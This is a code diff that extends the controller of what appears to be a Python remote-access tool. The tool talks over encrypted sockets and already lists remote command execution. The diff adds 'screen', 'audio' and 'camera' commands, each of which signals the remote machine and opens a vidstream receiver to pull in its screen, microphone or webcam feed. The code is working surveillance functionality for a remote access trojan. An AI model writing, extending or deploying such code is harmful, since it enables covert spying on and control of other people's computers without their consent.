@@ -2,7 +2,7 @@ from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
-import socket
+import socket, vidstream, pyautogui
 
 class color:
     BLACK = "\u001b[30m"
@@ -119,6 +119,21 @@ cd <Path>             Change Directory        Remote
 clear                 Clear Terminal          Local  
 execute               Run remote commands     Remote \n''')
         change = 1
+
+    elif command == "screen":
+        client_socket.send(crypt(str(data).encode()))
+        server = vidstream.StreamingServer("127.0.0.1", 9999)
+        server.start_server()
+    
+    elif command == "audio":
+        client_socket.send(crypt(str(data).encode()))
+        server = vidstream.AudioReceiver("127.0.0.1", 9898)
+        server.start_server()
+
+    elif command == "camera":
+        client_socket.send(crypt(str(data).encode()))
+        server = vidstream.StreamingServer("127.0.0.1", 9797)
+        server.start_server()
 
     elif command == "exit":
         print("Cleaning....")
